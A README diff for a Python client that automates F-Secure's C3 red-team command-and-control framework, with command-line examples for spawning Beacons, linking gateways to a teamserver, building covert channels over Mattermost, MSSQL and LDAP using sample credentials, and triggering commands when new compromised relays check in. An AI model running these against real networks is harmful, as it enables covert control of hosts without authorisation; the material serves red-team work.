@@ -1,15 +1,22 @@
-## F-Secure's C3 Client script
+# F-Secure's C3 Client script
 
 This is a simple [F-Secure's C3](https://github.com/FSecureLABS/C3) client Python script offering a few functions to interact with C3 framework in an automated manner.
 
 It connects to the C3 WebController (typically the one that's listening on port _52935_) and allows to issue API requests automating few things for us.
 
-### Usage:
+**Word of caution**: 
+
+The script may be unstable as its not that yet thoroughly tested. Consider adding `--dry-run` flag before using it to simulate HTTP POST requests instead of sending them to make sure it'll work as expected. 
+
+Also, some commands offer Agent filter criteria such as `--gateway-id`, `--relay-id` or `--channel-id` options. Use them to limit scope of this script's actions towards specific set of devices (Gateways, Relay, channels, etc). Otherwise the script picks broad range of nodes to commander. When for instance no filter criteria are given, all of the found channels/relays/gateways will receive commands.
+
+
+## Usage
 
 The script offers subcommands-kind of CLI interface, so after every command one can issue `--help` to get subcommand's help message.
 
 
-**General help**:
+### General help:
 
 ```
 PS> py .\c3-client.py --help
@@ -46,7 +53,7 @@ optional arguments:
                         HTTP Basic Authentication (user:pass)
 ```
 
-**Example of a sub-help**:
+### Example of a sub-help
 
 ```
 PS D:\> py c3-client.py http://192.168.0.200:52935 alarm relay --help
@@ -127,9 +134,9 @@ Currently, following commands are supported:
     - `beacon` - Adds peripheral Beacon or in other words spawns new Beacon on Relay
 
 
-### Example Usage
+## Example Usage
 
-**Example 1**
+### Example 1
 
 This example shows how to keep all of your Relays pinged every 45 seconds:
 
@@ -155,7 +162,7 @@ PS D:\> py c3-client.py http://192.168.0.200:52935 ping -k 45
 
 ```
 
-**Example 2**
+### Example 2
 
 Ever suffered from a poor C3 bandwidth or general performance? Worry not - you can easily clear/remove message queues from all of your channels with this simple trick:
 
@@ -198,7 +205,7 @@ PS D:\> py .\c3-client.py http://192.168.0.200:52935 channel all clear
 
 ```
 
-**Example 3**
+### Example 3
 
 In this example setup an alarm that triggers upon new Relay checking-in. Whenever that happens, a command is executed with placeholders that will be substituted with values extracted from Relay's metadata:
 
@@ -252,8 +259,51 @@ PS D:\> py c3-client.py http://192.168.0.200:52935 alarm relay -g gate4 --execut
 
 ```
 
+## Other notable use-cases
 
-### Author
+
+### 1. Download gateway
+
+py c3-client.py -v http://192.168.0.200:52935 download gateway c:\output\directory -G gate6 -O 192.168.0.200 -x
+
+### 2. Connect to Teamserver
+
+py c3-client.py -v http://192.168.0.200:52935 connector gate5 turnon teamserver 192.168.0.200 2223
+
+### 3. Setup Mattermost channel
+
+py c3-client.py -v http://192.168.0.200:52935 channel mattermost create gate5 http://192.168.0.210:8080 foobar c3g7sokucbgidgxxxxxxxxxx
+
+### 4. Setup MSSQL channel
+
+py c3-client.py -v http://192.168.0.200:52935 channel mssql create matter6 mssql-server.contoso.com master spt_foobar contoso\alice Password1! true
+
+### 5. Setup LDAP channel
+
+py c3-client.py -v http://192.168.0.200:52935 channel ldap create matter5 dc1.contoso.com alice@CONTOSO.COM Password1! CN=alice,CN=Users,DC=contoso,DC=com
+
+### 6. Spawn Beacon
+
+py c3-client.py -v http://192.168.0.200:52935 spawn beacon matter5
+
+### 7. Clear all channels
+
+py c3-client.py http://192.168.0.200:52935 channel all clear
+
+### 8. Clear network
+
+py c3-client.py http://192.168.0.200:52935 close network gate5
+
+### 9. Alarm
+
+py c3-client.py http://192.168.0.200:52935 alarm relay -g gate5 --execute "powershell -file speak.ps1 -message \`"New C3 Relay inbound: <domain>/<userName>, computer: <computerName>\`"" --execute "cmd /c new-relay.bat <relayId>"
+
+### 10. Ping Relays
+
+py c3-client.py http://192.168.0.200:52935 ping -k 45
+
+
+## Author
 
 ```
 Mariusz B. / mgeeky, '21
